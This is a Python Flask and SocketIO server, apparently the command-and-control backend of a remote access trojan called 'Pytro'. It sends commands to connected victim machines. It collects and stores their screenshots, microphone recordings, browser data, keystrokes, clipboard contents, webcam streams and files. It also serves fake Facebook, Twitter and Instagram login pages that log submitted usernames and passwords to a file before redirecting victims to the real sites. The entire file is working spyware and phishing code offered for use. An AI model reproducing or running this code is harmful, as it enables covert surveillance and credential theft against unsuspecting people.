import base64
import json
import logging
import os
import threading
import time
from datetime import datetime
from logging.handlers import RotatingFileHandler
from queue import Queue, Empty

import click
from flask import Flask, request, send_file, Response, jsonify, render_template, redirect, url_for
from flask_jwt_extended import create_access_token, jwt_required, JWTManager
from flask_migrate import Migrate
from flask_restx import Api, Resource, fields
from flask_socketio import SocketIO

from client.media_utils import gen_frames
from config.config import Config
from config.extensions import db
from models import Client, Command, CommandType

app = Flask(__name__, template_folder='ressources/templates', static_folder='ressources/static')
app.config.from_object(Config)
app.config['DEBUG'] = True
db.init_app(app)
migrate = Migrate(app, db)
jwt = JWTManager(app)
video_frames = Queue()
battery_status = {}
stop_streaming = False

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=50 ** 8)

authorizations = {
    'bearer_auth': {
        'type': 'apiKey',
        'in': 'header',
        'name': 'Authorization'
    }
}

api = Api(app, version='1.0', title='Pytro API Documentation',
          description='API Documentation for Pytro, a remote administration tool.',
          authorizations=authorizations)

auth_ns = api.namespace('api/v1/auth', description='Authentication operations')
command_ns = api.namespace('api/v1/command', description='Command operations')
clients_ns = api.namespace('api/v1/clients', description='Client operations')
screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations')
microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
browser_ns = api.namespace('api/v1/browser', description='Browser data operations')
keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
clipboard_ns = api.namespace('api/v1/clipboard', description='Clipboard operations')
download_file_ns = api.namespace('api/v1/download', description='Download file operations')
directory_ns = api.namespace('api/v1/directory', description='Directory operations')

auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
command_model = api.model('Command', {
    'command': fields.String(required=True, description='Commande à exécuter'),
    'params': fields.Raw(required=False, description='Paramètres de la commande')
})
client_model = api.model('Client', {
    'id': fields.Integer(required=True, description='ID du client'),
    'ip': fields.String(required=True, description='Adresse IP du client'),
    'os': fields.String(required=False, description='Système d\'exploitation du client'),
    'os_version': fields.String(required=False, description='Version du système d\'exploitation du client'),
    'hostname': fields.String(required=False, description='Nom d\'hôte du client'),
    'status': fields.String(required=True, description='Statut du client'),
    'date_created': fields.String(required=True, description='Date de création du client'),
    'date_updated': fields.String(required=True, description='Date de mise à jour du client')
})
screenshots_model = api.model('Screenshots', {
    'id': fields.Integer(required=True, description='ID de la capture d\'écran'),
    'file_path': fields.String(required=True, description='Chemin du fichier de la capture d\'écran'),
    'date_created': fields.String(required=True, description='Date de création de la capture d\'écran')
})
microphone_model = api.model('Microphone', {
    'id': fields.Integer(required=True, description='ID de l\'enregistrement audio'),
    'file_path': fields.String(required=True, description='Chemin du fichier de l\'enregistrement audio'),
    'date_created': fields.String(required=True, description='Date de création de l\'enregistrement audio')
})
browser_model = api.model('Browser', {
    'id': fields.Integer(required=True, description='ID des données du navigateur'),
    'browser_name': fields.String(required=True, description='Nom du navigateur'),
    'file_path': fields.String(required=True, description='Chemin du fichier des données du navigateur'),
    'date_created': fields.String(required=True, description='Date de création des données du navigateur')
})
keylogger_model = api.model('Keylogger', {
    'id': fields.Integer(required=True, description='ID du keylogger'),
    'file_path': fields.String(required=True, description='Chemin du fichier du keylogger'),
    'date_created': fields.String(required=True, description='Date de création du keylogger')
})
clipboard_model = api.model('Clipboard', {
    'id': fields.Integer(required=True, description='ID du clipboard'),
    'file_path': fields.String(required=True, description='Chemin d\'accès du fichier du clipboard'),
    'date_created': fields.String(required=True, description='Date de création du clipboard')
})
download_file_model = api.model('DownloadFile', {
    'id': fields.Integer(required=True, description='ID du fichier'),
    'file_path': fields.String(required=True, description='Chemin du fichier'),
    'date_created': fields.String(required=True, description='Date de création du fichier')
})
directory_model = api.model('Directory', {
    'dir_path': fields.String(required=True, description='Chemin du répertoire à lister')
})

client_params = api.parser()
client_params.add_argument('status', type=str, required=False, help='Filter clients by their status (online/offline).')


class RemoveColorFilter(logging.Filter):
    def filter(self, record):
        if record.args:
            record.args = tuple(click.unstyle(arg) if isinstance(arg, str) else arg for arg in record.args)
        if isinstance(record.msg, str):
            record.msg = click.unstyle(record.msg)
        return True


def setup_logging():
    log_directory = os.path.join(os.getcwd(), 'logs')
    os.makedirs(log_directory, exist_ok=True)

    log_file = os.path.join(log_directory, 'app.log')

    log_format = '%(asctime)s - %(levelname)s - %(message)s'
    date_format = '%d/%m/%Y %H:%M:%S'

    file_handler = RotatingFileHandler(log_file, maxBytes=10000, backupCount=10)
    file_handler.setLevel(logging.INFO)
    file_handler.setFormatter(logging.Formatter(log_format, datefmt=date_format))
    file_handler.addFilter(RemoveColorFilter())

    stream_handler = logging.StreamHandler()
    stream_handler.setLevel(logging.INFO)
    stream_handler.setFormatter(logging.Formatter(log_format, datefmt=date_format))
    stream_handler.addFilter(RemoveColorFilter())

    if app.logger.hasHandlers():
        app.logger.handlers.clear()

    app.logger.addHandler(file_handler)
    app.logger.addHandler(stream_handler)
    app.logger.setLevel(logging.INFO)
    app.logger.addFilter(RemoveColorFilter())

    werkzeug_logger = logging.getLogger('werkzeug')
    werkzeug_logger.addHandler(file_handler)
    werkzeug_logger.addHandler(stream_handler)
    werkzeug_logger.addFilter(RemoveColorFilter())


@auth_ns.route('/')
class Authenticate(Resource):
    @auth_ns.expect(auth_model)
    def post(self):
        auth_data = request.json
        if auth_data and auth_data.get('secret_key') == app.config['JWT_SECRET_KEY']:
            token = create_access_token(identity='bot_discord')
            app.logger.info(f"Authentification réussie, token généré: Bearer {token}")
            return {'access_token': f'Bearer {token}'}, 200
        else:
            app.logger.warning("Mauvaise clé secrète")
            return {"msg": "Mauvaise clé secrète"}, 401


@command_ns.route('/<int:client_id>')
class HandleCommand(Resource):
    @jwt_required()
    @command_ns.expect(command_model)
    @api.doc(security='bearer_auth')
    def post(self, client_id):
        command_data = request.get_json()
        command = command_data.get('command')
        user_id = command_data.get('user_id')
        params = command_data.get('params', {})

        if isinstance(params, str):
            try:
                params = json.loads(params)
            except json.JSONDecodeError:
                app.logger.error("Paramètres mal formés (JSON invalide).")
                return {'status': 'error', 'message': 'Paramètres mal formés (JSON invalide).'}, 400

        client = Client.query.get(client_id)
        if client and client.status == 'online':
            socketio.emit('command', {'command': command, 'params': params, 'user_id': user_id}, room=client.sid)
            app.logger.info(f"Commande *{command}* envoyée au client {client_id} / {client.ip}.")
            return {'status': 'success',
                    'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
        elif client and client.status == 'offline':
            app.logger.error(f"Client {client_id} hors ligne.")
            return {'status': 'error', 'message': f'**🔴 Client {client_id} hors ligne.'}, 400
        else:
            app.logger.error("Client non trouvé.")
            return {'status': 'error', 'message': 'Client non trouvé.'}, 404


@clients_ns.route('/')
class GetClients(Resource):
    @jwt_required()
    @clients_ns.expect(client_params)
    @clients_ns.marshal_with(client_model, as_list=True)
    @api.doc(security='bearer_auth')
    def get(self):
        status_filter = request.args.get('status')
        if status_filter:
            clients = Client.query.filter_by(status=status_filter).all()
        else:
            clients = Client.query.all()
        for client in clients:
            client.date_created = client.date_created.strftime('%d/%m/%Y à %H:%M:%S')
            client.date_updated = client.date_updated.strftime('%d/%m/%Y à %H:%M:%S')
        app.logger.info(f"Liste des clients récupérée ({len(clients)} clients)")
        return clients, 200


@screenshot_ns.route('/client/<int:client_id>')
class GetScreenshotsByClientId(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @screenshot_ns.marshal_with(screenshots_model, as_list=True)
    def get(self, client_id):
        screenshots = Command.query.filter_by(client_id=client_id, type=CommandType.SCREENSHOT).all()
        for screenshot in screenshots:
            screenshot.date_created = screenshot.date_created.strftime('%d/%m/%Y à %H:%M:%S')
        app.logger.info(
            f"Liste des captures d'écran récupérée pour le client {client_id} ({len(screenshots)} captures)")
        return screenshots, 200


@screenshot_ns.route('/image/<int:screenshot_id>')
class GetScreenshotImage(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, screenshot_id):
        screenshot = Command.query.get(screenshot_id)
        if screenshot and os.path.exists(screenshot.file_path):
            app.logger.info(f"Capture d'écran trouvée: {screenshot.file_path} pour le client {screenshot.client_id}")
            return send_file(screenshot.file_path, mimetype='image/png')
        else:
            app.logger.error("Capture d'écran non trouvée.")
            return {'status': 'error', 'message': 'Capture d\'écran non trouvée.'}, 404


@microphone_ns.route('/client/<int:client_id>')
class GetMicrophonesByClientId(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @microphone_ns.marshal_with(microphone_model, as_list=True)
    def get(self, client_id):
        microphones = Command.query.filter_by(client_id=client_id, type=CommandType.MICROPHONE).all()
        for microphone in microphones:
            microphone.date_created = microphone.date_created.strftime('%d/%m/%Y à %H:%M:%S')
        app.logger.info(
            f"Liste des enregistrements audio récupérée pour le client {client_id} ({len(microphones)} enregistrements)")
        return microphones, 200


@microphone_ns.route('/audio/<int:microphone_id>')
class GetMicrophoneAudio(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, microphone_id):
        microphone = Command.query.get(microphone_id)
        if microphone and os.path.exists(microphone.file_path):
            app.logger.info(
                f"Enregistrement audio trouvé: {microphone.file_path} pour le client {microphone.client_id}")
            return send_file(microphone.file_path, mimetype='audio/wav')
        else:
            app.logger.error("Enregistrement audio non trouvé.")
            return {'status': 'error', 'message': 'Enregistrement audio non trouvé.'}, 404


@browser_ns.route('/client/<int:client_id>/<string:browser_name>')
class GetBrowserDataByClientId(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @browser_ns.marshal_with(browser_model, as_list=True)
    def get(self, client_id, browser_name):
        browser_data = Command.query.filter_by(client_id=client_id, type=CommandType.BROWSER_DATA,
                                               browser_name=browser_name).all()
        for data in browser_data:
            data.date_created = data.date_created.strftime('%d/%m/%Y à %H:%M:%S')
        app.logger.info(
            f"Données du navigateur récupérées pour le client {client_id} ({len(browser_data)} enregistrements)")
        return browser_data, 200


@browser_ns.route('/data/<int:browser_id>')
class GetBrowserDataFile(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, browser_id):
        data = Command.query.get(browser_id)
        if data and os.path.exists(data.file_path):
            app.logger.info(
                f"Fichier de données du navigateur trouvé: {data.file_path} pour le client {data.client_id}")
            return send_file(data.file_path, mimetype='text/plain')
        else:
            app.logger.error("Fichier de données du navigateur non trouvé.")
            return {'status': 'error', 'message': 'Fichier de données du navigateur non trouvé.'}, 404


@keylogger_ns.route('/client/<int:client_id>')
class GetKeyloggersByClientId(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @keylogger_ns.marshal_with(keylogger_model, as_list=True)
    def get(self, client_id):
        keyloggers = Command.query.filter_by(client_id=client_id, type=CommandType.KEYLOGGER).all()
        for keylogger in keyloggers:
            keylogger.date_created = keylogger.date_created.strftime('%d/%m/%Y à %H:%M:%S')
        return keyloggers, 200


@keylogger_ns.route('/log/<int:keylogger_id>')
class GetKeyloggerLog(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, keylogger_id):
        keylogger = Command.query.get(keylogger_id)
        if keylogger and os.path.exists(keylogger.file_path):
            return send_file(keylogger.file_path, mimetype='text/plain')
        else:
            return {'status': 'error', 'message': 'Fichier du keylogger non trouvé.'}, 404


@clipboard_ns.route('/client/<int:client_id>')
class GetClipboardsByClientId(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @clipboard_ns.marshal_with(clipboard_model, as_list=True)
    def get(self, client_id):
        clipboards = Command.query.filter_by(client_id=client_id, type=CommandType.CLIPBOARD).all()
        for clipboard in clipboards:
            clipboard.date_created = clipboard.date_created.strftime('%d/%m/%Y à %H:%M:%S')
        return clipboards, 200


@clipboard_ns.route('/content/<int:clipboard_id>')
class GetClipboardFile(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, clipboard_id):
        clipboard = Command.query.get(clipboard_id)
        if clipboard and os.path.exists(clipboard.file_path):
            return send_file(clipboard.file_path, mimetype='text/plain')
        else:
            return {'status': 'error', 'message': 'Fichier du clipboard non trouvé.'}, 404


@webcam_ns.route('/link/<int:client_id>')
class GetWebcamLink(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, client_id):
        client = Client.query.get(client_id)
        if client:
            sid = client.sid
            battery_info = battery_status.get(sid, {})
            if battery_info.get('percent', 100) < 20 and not battery_info.get('power_plugged', True):
                return {'status': 'error',
                        'message': 'La caméra ne peut pas être activée car la batterie est inférieure '
                                   'à 20% et non branchée.'}, 400
            else:
                return {'status': 'success', 'message': f'/api/v1/webcam/{client_id}'}, 200
        else:
            return {'status': 'error', 'message': 'Client non trouvé.'}, 404


@webcam_ns.route('/stop/<int:client_id>')
class StopWebcam(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, client_id):
        client = Client.query.get(client_id)
        if not client:
            return {'status': 'error', 'message': 'Client non trouvé.'}, 404
        if client.status == 'offline':
            return {'status': 'error', 'message': 'Client hors ligne.'}, 400

        socketio.emit('stop_stream', room=client.sid)
        return {'status': 'success', 'message': 'Commande pour arrêter la webcam envoyée.'}, 200


@webcam_ns.route('/<int:client_id>')
class StreamWebcam(Resource):
    def get(self, client_id):
        client = Client.query.get(client_id)
        if not client:
            return {'status': 'error', 'message': 'Client non trouvé.'}, 404
        if client.status == 'offline':
            return {'status': 'error', 'message': 'Client hors ligne.'}, 400

        sid = client.sid
        battery_info = battery_status.get(sid, {})
        if battery_info.get('percent', 100) < 20 and not battery_info.get('power_plugged', True):
            return {'status': 'error', 'message': 'La caméra ne peut pas être activée car la batterie est inférieure '
                                                  'à 20% et non branchée.'}, 400

        global stop_streaming
        stop_streaming = False
        socketio.emit('start_stream', room=client.sid)
        threading.Thread(target=gen_frames, args=(socketio,)).start()
        return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')


@directory_ns.route('/client/<int:client_id>')
class ListDirectory(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @directory_ns.expect(directory_model)
    def post(self, client_id):
        data = request.json
        dir_path = data.get('dir_path')
        user_id = data.get('user_id')

        client = Client.query.get(client_id)
        if client and client.status == 'online':
            socketio.emit('list_directory', {'dir_path': dir_path}, room=client.sid)
            app.logger.info(f"Commande *list_directory* envoyée au client {client_id} / {client.ip}.")

            start_time = time.time()
            timeout = 10
            while time.time() - start_time < timeout:
                socketio.sleep(1)
                if hasattr(socketio, 'last_directory_listing'):
                    response = socketio.last_directory_listing
                    del socketio.last_directory_listing

                    if db.session.query(Command).filter_by(dir_path=dir_path).count() == 0:
                        new_command = Command(
                            type=CommandType.DIRECTORY_LISTING,
                            client_id=client_id,
                            dir_path=dir_path,
                            date_created=datetime.now(),
                            user_id=user_id
                        )
                        db.session.add(new_command)
                        db.session.commit()

                    return jsonify(response)

            return {'status': 'error', 'message': 'Timeout waiting for directory listing response.'}, 504

        elif client and client.status == 'offline':
            return {'status': 'error', 'message': 'Client hors ligne.'}, 400
        else:
            return {'status': 'error', 'message': 'Client non trouvé.'}, 404


@download_file_ns.route('/client/<int:client_id>')
class ListDownloadFile(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    @download_file_ns.marshal_with(download_file_model, as_list=True)
    def get(self, client_id):
        download_files = Command.query.filter_by(client_id=client_id, type=CommandType.DOWNLOAD_FILE).all()
        for download_file in download_files:
            download_file.date_created = download_file.date_created.strftime('%d/%m/%Y à %H:%M:%S')
        return download_files, 200


@download_file_ns.route('/file/<int:download_file_id>')
class GetDownloadFile(Resource):
    @jwt_required()
    @api.doc(security='bearer_auth')
    def get(self, download_file_id):
        download_file = Command.query.get(download_file_id)
        if download_file and os.path.exists(download_file.file_path):
            return send_file(download_file.file_path)
        else:
            return {'status': 'error', 'message': 'Fichier non trouvé.'}, 404


@socketio.on('connect')
def handle_connect():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    app.logger.info(f"Client connecté: {client_ip}")
    sid = request.sid
    client = Client.query.filter_by(ip=client_ip).first()
    if client:
        client.status = 'online'
        client.sid = sid
        client.date_updated = datetime.now()
    else:
        client = Client(ip=client_ip, status='online', sid=sid, date_created=datetime.now())
        db.session.add(client)
    db.session.commit()


@socketio.on('system_info')
def handle_system_info(data):
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client.os = data.get('os')
        client.os_version = data.get('os_version')
        client.hostname = data.get('hostname')
        db.session.commit()


@socketio.on('screenshot_response')
def handle_screenshot(data):
    screenshot_bytes = base64.b64decode(data.get('screenshot'))
    user_id = data.get('user_id')
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client_ip = client.ip
        screenshot_dir = f"screenshots/{client_ip}/{datetime.now().strftime('%Y-%m-%d')}"
        os.makedirs(screenshot_dir, exist_ok=True)
        file_name = f"{datetime.now().strftime('%H-%M-%S')}.png"
        screenshot_path = f"{screenshot_dir}/{file_name}"
        with open(screenshot_path, 'wb') as f:
            f.write(screenshot_bytes)
        new_command = Command(type=CommandType.SCREENSHOT, client_id=client.id, file_path=screenshot_path,
                              user_id=user_id)
        db.session.add(new_command)
        db.session.commit()
        app.logger.info(f"Capture d'écran reçue de {client_ip} et enregistrée sous {screenshot_path}")


@socketio.on('audio_response')
def handle_audio(data):
    audio_bytes = base64.b64decode(data.get('audio'))
    user_id = data.get('user_id')
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client_ip = client.ip
        audio_dir = f"audio/{client_ip}/{datetime.now().strftime('%Y-%m-%d')}"
        os.makedirs(audio_dir, exist_ok=True)
        file_name = f"{datetime.now().strftime('%H-%M-%S')}.wav"
        audio_path = f"{audio_dir}/{file_name}"
        with open(audio_path, 'wb') as f:
            f.write(audio_bytes)
        new_command = Command(type=CommandType.MICROPHONE, client_id=client.id, file_path=audio_path, user_id=user_id)
        db.session.add(new_command)
        db.session.commit()
        app.logger.info(f"Enregistrement audio reçu de {client_ip} et enregistré sous {audio_path}")


@socketio.on('browser_data_response')
def handle_browser_data(data):
    sid = request.sid
    user_id = data.get('user_id')
    client = Client.query.filter_by(sid=sid).first()
    if client:
        browser = data.get('browser')
        type = data.get('type')
        data = data.get('data')
        browser_dir = f"browsers/{client.ip}/{browser}"
        os.makedirs(browser_dir, exist_ok=True)
        file_path = f"{browser_dir}/{type}.txt"
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(data)
        if db.session.query(Command).filter_by(file_path=file_path).count() > 0:
            return
        new_command = Command(type=CommandType.BROWSER_DATA,
                              client_id=client.id,
                              file_path=file_path,
                              browser_name=browser,
                              user_id=user_id)
        db.session.add(new_command)
        db.session.commit()
        app.logger.info(f"Données du navigateur reçues de {client.ip} et enregistrées sous {file_path}")


@socketio.on('keyboard_response')
def handle_keyboard(data):
    sid = request.sid
    user_id = data.get('user_id')
    client = Client.query.filter_by(sid=sid).first()
    if client:
        keylogger_dir = f"keyloggers/{client.ip}/{datetime.now().strftime('%Y-%m-%d')}"
        os.makedirs(keylogger_dir, exist_ok=True)
        file_name = f"{datetime.now().strftime('%H')}.txt"
        keylogger_path = f"{keylogger_dir}/{file_name}"
        with open(keylogger_path, 'a', encoding='utf-8') as f:
            for key in data.get('keyboard_log'):
                f.write(f"{key}\n")
        new_command = Command(type=CommandType.KEYLOGGER, client_id=client.id, file_path=keylogger_path,
                              user_id=user_id)
        if db.session.query(Command).filter_by(file_path=keylogger_path).count() > 0:
            update_command = Command.query.filter_by(file_path=keylogger_path).first()
            update_command.date_updated = datetime.now()
            db.session.commit()
        else:
            db.session.add(new_command)
            db.session.commit()

        app.logger.info(f"Journal des touches reçu de {client.ip} et enregistré sous {keylogger_path}")


@socketio.on('clipboard_response')
def handle_clipboard(data):
    sid = request.sid
    user_id = data.get('user_id')
    client = Client.query.filter_by(sid=sid).first()
    if client:
        clipboard_dir = f"clipboards/{client.ip}/{datetime.now().strftime('%Y-%m-%d')}"
        os.makedirs(clipboard_dir, exist_ok=True)
        file_name = f"{datetime.now().strftime('%H')}.txt"
        clipboard_path = f"{clipboard_dir}/{file_name}"
        with open(clipboard_path, 'a', encoding='utf-8') as f:
            f.write(data.get('clipboard_content'))
        new_command = Command(type=CommandType.CLIPBOARD, client_id=client.id, file_path=clipboard_path,
                              user_id=user_id)
        if db.session.query(Command).filter_by(file_path=clipboard_path).count() > 0:
            update_command = Command.query.filter_by(file_path=clipboard_path).first()
            update_command.date_created = datetime.now()
            db.session.commit()
        else:
            db.session.add(new_command)
            db.session.commit()
        app.logger.info(f"Contenu du clipboard reçu de {client.ip} et enregistré sous {clipboard_path}")


@socketio.on('battery_status')
def handle_battery_status(data):
    sid = request.sid
    battery_status[sid] = data


@socketio.on('webcam_response')
def handle_frame(data):
    frame_data = base64.b64decode(data.get('data'))
    video_frames.put(frame_data)


@socketio.on('stop_stream')
def handle_stop_stream():
    global stop_streaming
    stop_streaming = True
    app.logger.info("Arrêt du streaming demandé par le client.")

@socketio.on('file_response')
def handle_file(data):
    file_data = base64.b64decode(data.get('file'))
    user_id = data.get('user_id')
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client_ip = client.ip
        file_dir = f"download_files/{client_ip}"
        os.makedirs(file_dir, exist_ok=True)
        file_name = data.get('file_name')
        file_path = f"{file_dir}/{file_name}"
        with open(file_path, 'wb') as f:
            f.write(file_data)
        new_command = Command(type=CommandType.DOWNLOAD_FILE, client_id=client.id, file_path=file_path, user_id=user_id)
        db.session.add(new_command)
        db.session.commit()
        app.logger.info(f"Fichier reçu de {client_ip} et enregistré sous {file_path}")


@socketio.on('directory_listing_response')
def handle_directory_listing(data):
    directory_listing = data.get('directory_listing')
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        socketio.last_directory_listing = directory_listing
        app.logger.info(f"Liste des répertoires reçue de {client.ip}")


@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client.status = 'offline'
        client.date_updated = datetime.now()
        db.session.commit()
        app.logger.info(f"Client déconnecté: {client.ip}")


def stream_frames():
    global stop_streaming
    while not stop_streaming:
        try:
            frame_data = video_frames.get(timeout=1)
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
        except Empty:
            continue


@app.route('/')
def home():
    return redirect(url_for('fake_facebook'))

@app.route('/facebook')
def fake_facebook():
    return render_template('facebook.html')

@app.route('/twitter')
def fake_twitter():
    return render_template('twitter.html')

@app.route('/instagram')
def fake_instagram():
    return render_template('instagram.html')

@app.route('/login', methods=['POST'])
def login():
    # Vérifiez que tous les champs nécessaires sont présents
    if 'username' in request.form and 'password' in request.form and 'origin' in request.form:
        username = request.form['username']
        password = request.form['password']
        origin = request.form['origin']

        # Create folder and file if it doesn't exist
        if not os.path.exists('phishing'):
            os.makedirs('phishing')

        with open('phishing/login_data.txt', 'a') as file:
            file.write(f'Username: {username}, Password: {password}, Origin: {origin}\n')
        # Redirection vers la vraie page de connexion
        if origin == 'facebook':
            return redirect('https://www.facebook.com/login')
        elif origin == 'twitter':
            return redirect('https://twitter.com/login')
        elif origin == 'instagram':
            return redirect('https://www.instagram.com/accounts/login/')
        else:
            return redirect(url_for('home'))  # Fallback si l'origine n'est pas connue
    else:
        return "Missing data", 400


setup_logging()
if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, ssl_context=('cert.pem', 'key.pem'))
